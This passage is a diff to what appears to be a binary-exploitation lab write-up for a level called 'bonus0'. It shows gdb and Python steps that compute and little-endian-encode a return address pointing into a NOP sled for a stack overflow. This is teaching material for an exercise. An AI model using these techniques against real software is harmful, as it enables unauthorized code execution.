@@ -23,10 +23,21 @@ gdb ./bonus0
 0xbfffe674:     0xbfffe680
 ```
 
-Take the second number (`0xbfffe680`). Turn it into a target + little-endian bytes:
+Get the target address (buffer + 60, landing inside the sled) in the same gdb session instead of doing the math by hand:
+
+```
+(gdb) p/x *(int*)($esp+8) + 60
+$1 = 0xbfffe6bc
+(gdb) q
+A debugging session is active.
+        Inferior 1 [process ...] will be killed. now what? y
+```
+(`y` confirms killing the process, gdb doesn't disconnect on its own; there is no `exit` command)
+
+Turn that address into little-endian bytes (gdb can't do this part, it's not reading memory, it's re-encoding a number):
 
 ```bash
-$ python -c 'addr = 0xbfffe680 + 60; print "\\x%02x\\x%02x\\x%02x\\x%02x" % (addr&0xff,(addr>>8)&0xff,(addr>>16)&0xff,(addr>>24)&0xff)'
+$ python -c 'addr = 0xbfffe6bc; print "\\x%02x\\x%02x\\x%02x\\x%02x" % (addr&0xff,(addr>>8)&0xff,(addr>>16)&0xff,(addr>>24)&0xff)'
 \xbc\xe6\xff\xbf
 ```
 
